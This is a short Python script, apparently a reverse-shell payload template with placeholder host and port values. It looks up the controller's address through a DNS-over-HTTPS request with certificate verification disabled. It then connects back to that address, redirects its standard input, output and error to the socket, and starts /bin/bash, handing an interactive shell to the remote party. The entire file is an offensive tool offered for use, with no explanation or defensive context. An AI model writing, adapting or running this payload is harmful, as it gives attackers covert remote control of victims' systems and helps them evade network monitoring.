import socket,subprocess,os,requests,re

ipv4 = "((([01]?[0-9]?[0-9]|2[0-4][0-9]|25[0-5])[ (\[]?(\.|dot)[ )\]]?){3}([01]?[0-9]?[0-9]|2[0-4][0-9]|25[0-5]))"

def listToString(s):
    str1 = ""

    for ele in s:
        str1 += ele
    return str1

host="REPL_HOST"
port=REPL_PORT

url = 'https://1.1.1.1/dns-query'
client = requests.session()
params = {
        'name': host,
        'type': 'A',
        'ct': 'application/dns-json'
}
data = client.get(url, params=params, verify=False)
json_data = str(data.json())

host = [match[0] for match in re.findall(ipv4, json_data)]
host = listToString(host)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call("/bin/bash")
